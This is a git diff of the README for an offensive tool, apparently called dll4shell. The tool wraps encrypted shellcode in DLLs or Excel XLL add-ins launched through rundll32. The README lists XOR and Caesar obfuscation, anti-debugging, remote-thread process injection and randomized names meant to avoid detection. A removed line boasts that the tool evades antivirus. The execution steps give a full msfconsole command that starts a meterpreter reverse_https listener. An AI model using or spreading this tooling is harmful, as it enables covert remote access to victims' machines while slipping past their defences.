@@ -1,15 +1,14 @@
 ### C++ shellcode launcher
 
-Dll generator designed to run the shellcode via rundll32. Based on the "charlotte" tool and research mentioned in external references. Current features include:
+A collection of shellcode injection techniques to run as dll via rundll32. Based on the "charlotte" tool and research mentioned in external references. 
+
+Current features include:
 
 * Using classic chain VirtualAlloc - CreateThread to execute the code in rundll32 process.
 * Shellcode XOR and Cezar / Shift encryption.
 * Simple python script to do the magic.
 * Random names of functions and params for obfuscation.
 
-As of now, the dll created with meterpreter code is detected by 5 / 65 vendors. Although VirusTotal suggests Defender detects the payload, on the real machines it does not.
-
-![](dll4shell.png)
 
 ### Execution steps
 ```
@@ -21,6 +20,23 @@ python dll4shell.py -e xor (alternalively: -e shift)
 
 sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST YOUR_IP; set LPORT 8443; exploit"
 ```
+
+Techniques used (`-e` parameter):
+
+|Value           |Obfuscation method, Details    |Code invocation              |
+|----------------|-------------------------------|-----------------------------|
+|xor             |XOR, const char                |VirtualAlloc, CreateThread   |
+|xor1            |XOR, unsigned char             |VirtualAlloc, CreateThread   |
+|xor2            |XOR, antidebugging             |ProcInj (VirtualAllocEx, CreateRemoteThread)|
+|xor3            |XOR, antidebugging             |hHeapAlloc, hCreateThread    |
+|shift           |Cezar, const char              |VirtualAlloc, CreateThread   |
+|shift1          |Cezar, unsigned char           |VirtualAlloc, CreateThread   |
+
+Outputs (`-o` parameter):
+
+|dll            |DLL callable via rundll32|
+|xll            |XLL callable via Add-Ins|
+
 
 ### External references
 
